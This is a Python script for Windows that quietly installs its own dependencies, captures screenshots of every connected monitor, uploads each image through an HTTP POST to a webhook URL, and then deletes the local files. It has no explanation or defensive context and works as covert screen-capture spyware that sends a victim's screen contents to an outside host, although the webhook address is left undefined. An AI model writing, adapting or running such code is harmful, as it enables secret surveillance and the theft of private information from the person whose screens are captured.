import subprocess
import sys
import os
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from PIL import ImageGrab
except ImportError:
    install('Pillow')
    from PIL import ImageGrab
try:
    from screeninfo import get_monitors
except ImportError:
    install('screeninfo')
    from screeninfo import get_monitors
try:
    import win32gui
except ImportError:
    install('pywin32')
    import win32gui
try:
    import win32ui
except ImportError:
    install('pywin32')
    import win32ui
try:
    import win32con
except ImportError:
    install('pywin32')
    import win32con
def capture_screenshot(monitor):
    hwin = win32gui.GetDesktopWindow()
    width = monitor.width
    height = monitor.height
    left = monitor.x
    top = monitor.y
    hwindc = win32gui.GetWindowDC(hwin)
    srcdc = win32ui.CreateDCFromHandle(hwindc)
    memdc = srcdc.CreateCompatibleDC()
    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(srcdc, width, height)
    memdc.SelectObject(bmp)
    memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
    bmpinfo = bmp.GetInfo()
    bmpstr = bmp.GetBitmapBits(True)
    from PIL import Image
    img = Image.frombuffer(
        'RGB',
        (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
        bmpstr, 'raw', 'BGRX', 0, 1)
    memdc.DeleteDC()
    win32gui.DeleteObject(bmp.GetHandle())
    srcdc.DeleteDC()
    win32gui.ReleaseDC(hwin, hwindc)
    return img
def capture_screenshots():
    file_paths = []
    monitors = get_monitors()
    for i, monitor in enumerate(monitors, start=1):
        screenshot = capture_screenshot(monitor)
        filename = f'screenshot_screen_{i}.png'
        screenshot.save(filename)
        file_paths.append(filename)
        with open(filename, 'rb') as f:
            response = requests.post(
                webhook_url,
                files={"file": f}
            )
        if os.path.exists(filename):
            os.remove(filename)
    return file_paths
def main():
    capture_screenshots()
if __name__ == "__main__":
    main()
